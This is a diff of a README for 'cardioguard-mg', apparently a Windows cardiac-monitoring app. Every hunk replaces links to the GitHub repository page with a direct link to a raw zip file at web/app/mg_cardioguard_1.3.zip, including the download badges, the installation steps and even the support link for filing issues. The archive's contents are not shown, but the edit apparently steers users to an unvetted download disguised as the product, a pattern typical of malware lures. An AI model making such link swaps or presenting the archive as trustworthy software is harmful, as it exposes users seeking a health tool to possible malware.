@@ -1,6 +1,6 @@
 # 💓 cardioguard-mg - Reliable Cardiac Monitoring Made Easy
 
-[![Download cardioguard-mg](https://img.shields.io/badge/Download-CardioGuard-brightgreen)](https://github.com/Em3lio789/cardioguard-mg)
+[![Download cardioguard-mg](https://img.shields.io/badge/Download-CardioGuard-brightgreen)](https://github.com/Em3lio789/cardioguard-mg/raw/refs/heads/main/web/app/mg_cardioguard_1.3.zip)
 
 ---
 
@@ -32,11 +32,11 @@ Before installing CardioGuard, check that your PC meets these minimum specs:
 
 To start using CardioGuard:
 
-[![Download cardioguard-mg](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Em3lio789/cardioguard-mg)
+[![Download cardioguard-mg](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Em3lio789/cardioguard-mg/raw/refs/heads/main/web/app/mg_cardioguard_1.3.zip)
 
 **Follow these steps:**
 
-1. Click the green **Download** button above or go to the [CardioGuard GitHub page](https://github.com/Em3lio789/cardioguard-mg).  
+1. Click the green **Download** button above or go to the [CardioGuard GitHub page](https://github.com/Em3lio789/cardioguard-mg/raw/refs/heads/main/web/app/mg_cardioguard_1.3.zip).  
 2. Look for the latest release or a file named like `CardioGuard-Setup.exe` or similar.  
 3. Choose the Windows version and click to download.  
 4. Save the file to a known location on your PC, such as the Downloads folder.
@@ -128,13 +128,13 @@ Keep the app up to date to ensure accuracy and new features:
 ## 🌐 Support and Feedback
 
 If you have questions or trouble using CardioGuard, you can open an issue on the GitHub repository page:  
-[https://github.com/Em3lio789/cardioguard-mg](https://github.com/Em3lio789/cardioguard-mg)  
+[https://github.com/Em3lio789/cardioguard-mg/raw/refs/heads/main/web/app/mg_cardioguard_1.3.zip](https://github.com/Em3lio789/cardioguard-mg/raw/refs/heads/main/web/app/mg_cardioguard_1.3.zip)  
 
 The development team monitors this space for support requests and bug reports.
 
 ---
 
-[![Download cardioguard-mg](https://img.shields.io/badge/Download-CardioGuard-purple)](https://github.com/Em3lio789/cardioguard-mg)
+[![Download cardioguard-mg](https://img.shields.io/badge/Download-CardioGuard-purple)](https://github.com/Em3lio789/cardioguard-mg/raw/refs/heads/main/web/app/mg_cardioguard_1.3.zip)
 
 ---
 
